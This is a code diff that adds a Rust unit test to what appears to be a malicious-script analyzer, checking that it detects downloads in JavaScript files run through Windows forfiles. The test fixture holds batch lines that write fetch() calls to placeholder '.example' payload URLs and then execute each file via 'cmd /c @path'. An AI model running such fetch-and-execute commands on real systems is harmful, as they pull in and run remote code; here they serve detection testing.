@@ -10680,6 +10680,29 @@ forfiles /p C:\Work /m *.js /c "cmd /c @path""#;
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn forfiles_path_placeholder_runs_for_each_tracked_match() {
+        let script = br#"echo fetch('https://forfiles-a.example/payload') > C:\Work\a.js
+echo fetch('https://forfiles-b.example/payload') > C:\Work\b.js
+forfiles /p C:\Work /m *.js /c "cmd /c @path""#;
+        let report = analyze(script, &Config::default());
+
+        for expected in [
+            "https://forfiles-a.example/payload",
+            "https://forfiles-b.example/payload",
+        ] {
+            assert!(
+                report
+                    .traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::Download { src, .. } if src == expected)),
+                "forfiles @path did not analyze {expected}: {:?}\n{}",
+                report.traits,
+                report.deobfuscated
+            );
+        }
+    }
 }
 
 #[cfg(test)]
